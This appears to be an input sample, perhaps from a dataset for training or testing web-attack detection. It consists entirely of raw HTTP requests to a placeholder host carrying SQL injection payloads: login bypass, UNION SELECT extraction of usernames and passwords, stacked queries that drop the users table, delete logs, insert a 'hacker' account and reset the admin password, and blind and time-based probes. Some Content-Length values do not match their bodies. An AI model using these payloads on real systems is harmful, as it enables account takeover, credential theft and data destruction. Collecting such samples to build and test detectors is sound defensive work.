user_input:
GET /login.php?id=1' OR '1'='1 HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0

POST /search.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 67

query=admin' UNION SELECT username,password FROM users--

GET /user.php?id=1; DROP TABLE users;-- HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0

POST /login.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

username=admin&password=pass' OR '1'='1'--

GET /product.php?id=1' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0

POST /api/users HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 89

{"name":"test","email":"test@test.com' UNION SELECT password FROM users--"}

GET /search.php?q=test' OR 1=1-- HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0

POST /admin.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 67

user=admin' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--

GET /report.php?id=1' UNION SELECT NULL,username,password FROM users-- HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0

POST /upload.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

file=test.jpg'; INSERT INTO users VALUES ('hacker','pass')--

GET /profile.php?id=1' AND (SELECT SLEEP(5))-- HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0

POST /comment.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 78

comment=Nice post!'; UPDATE users SET password='hacked' WHERE username='admin'--

GET /api/data?id=1' OR 1=1 ORDER BY 1-- HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0

POST /delete.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

id=1'; DELETE FROM logs WHERE id>0--

GET /export.php?format=csv&table=users' UNION SELECT * FROM admin_users-- HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0

POST /reset.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 67

token=123456'; INSERT INTO sessions VALUES ('hacker','admin_token')--

GET /filter.php?category=1' AND (SELECT COUNT(*) FROM users)>0-- HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0

POST /api/filter HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 89

{"filter":"name='admin' UNION SELECT password FROM users--"}

GET /stats.php?period=2024' AND (SELECT COUNT(*) FROM sensitive_data)>0-- HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
